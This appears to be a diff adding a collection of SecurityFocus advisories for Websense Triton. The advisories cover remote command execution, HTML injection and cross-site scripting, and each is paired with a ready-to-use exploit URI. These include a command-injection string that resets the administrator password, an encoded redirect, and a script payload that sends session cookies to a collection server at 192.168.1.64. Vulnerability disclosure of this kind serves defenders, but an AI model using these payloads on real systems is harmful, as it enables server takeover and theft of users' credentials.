@@ -1,0 +1,52 @@
+Source: http://www.securityfocus.com/bid/51086/info
+
+Websense Triton is prone to a remote command-execution vulnerability. 
+
+An attacker can exploit this issue to execute arbitrary commands with SYSTEM-level privileges. Successfully exploiting this issue will result in the complete compromise of affected computers.
+
+The following example URI is available:
+
+https://www.example.com/explorer_wse/ws_irpt.exe?&SendFile=echo.pdf%26net user administrator blah|
+
+###################################################
+
+Source: http://www.securityfocus.com/bid/51088/info
+
+Websense Triton 'favorites.exe' HTML Injection Vulnerability
+
+Websense Triton is prone to an HTML-injection vulnerability because it fails to properly sanitize user-supplied input. 
+
+Attacker-supplied HTML and script code could be executed in the context of the affected site, potentially allowing the attacker to steal cookie-based authentication credentials or control how the site is rendered to the user; other attacks are also possible. 
+
+
+https://www.example.com/explorer_wse/favorites.exe?Program=ws_irpt.exe&params=startDate=2011-10-29^endDate=2011-10-
+29^rnd=936737^&favName=---------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+%22,%2215%22,%229%22,%2228%22,%2215%22,%229%22,%2228%22]]%3b%0D%09alert%28document.cookie%29%3b%0D%09//&user=admin&uid=&action=add&startDate=2011-10-29&endDate=2011-10-
+29&vrn=
+
+Arbitrary redirect
+
+https://www.example.com/explorer_wse/favorites.exe?Program=ws_irpt.exe&params=startDate=2011-10-29^endDate=2011-10-
+29^rnd=936737^&favName=---------------------------------------------------------------------------------------------------------------------------------------------------
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+%22,%2215%22,%229%22,%2228%22,%2215%22,%229%22,%2228%22]]%3bdocument.location%20%3d%20%22%68%74%74%70%3a%2f%2f%31%39%32%2e%31%36%38%2e%32%33%33%2e%31%31%2findex2.html
+%22%3b//&user=admin&uid=&action=add&startDate=2011-10-29&endDate=2011-10-29&vrn=
+
+
+###################################################
+
+
+Source: http://www.securityfocus.com/bid/51085/info
+
+Websense Triton Report Management Interface Cross Site Scripting Vulnerability
+
+Websense Triton is prone to a cross-site scripting vulnerability. 
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and launch other attacks. 
+
+https://www.example.com/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>alert(document.cookie)</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360
+
+Send the current session-cookies to a credentials-collection server:
+
+https://www.example.com/explorer_wse/detail.exe?c=cat&cat=153&anon=&startDate=2011-10-22&endDate=2011-10-22&session=a434cf98f3a402478599a71495a4a71e&dTitle=Internet_use_by_Category"><script>document.location=unescape("http://192.168.1.64/"%2bencodeURIComponent(document.cookie))</script>&section=1&uid=&col=1&cor=1&explorer=1&fork=1&puid=7360
